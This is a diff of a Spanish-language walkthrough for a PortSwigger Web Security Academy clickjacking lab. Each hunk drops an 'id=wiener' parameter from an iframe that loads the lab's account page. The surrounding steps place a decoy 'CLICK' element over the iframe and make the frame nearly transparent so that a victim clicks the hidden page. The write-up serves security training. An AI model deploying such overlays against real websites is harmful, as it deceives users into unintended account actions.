@@ -51,7 +51,7 @@ Ahora procedemos a darle estilo al `iframe`:
   }
 </style>
 
-<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account"></iframe>
 
 ```
 
@@ -77,7 +77,7 @@ Ahora vamos a agregar un botón:
 </style>
 
 <div>click</div>
-<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account"></iframe>
 ```
 
 Nosotros podemos ver el elemento `click`:
@@ -102,7 +102,7 @@ La idea ahora es ir probando hasta encontrar la configuración de modo tal que e
 </style>
 
 <div>CLICK</div>
-<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account"></iframe>
 ```
 
 ![image](https://github.com/user-attachments/assets/97c77e35-9026-4ac1-a168-f7ea83709db6)
@@ -126,7 +126,7 @@ Ahora procedemos a bajar la transparencia de modo que el `iframe` quede casi imp
 </style>
 
 <div>CLICK</div>
-<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account?id=wiener"></iframe>
+<iframe src="https://0aef009e0453d5f282da6b77000a0060.web-security-academy.net/my-account"></iframe>
 ```
 De modo tal que si la víctima visita esta página, verá lo siguiente:
 ![image](https://github.com/user-attachments/assets/edca2881-3f92-40ca-9583-0aceacf2d34b)
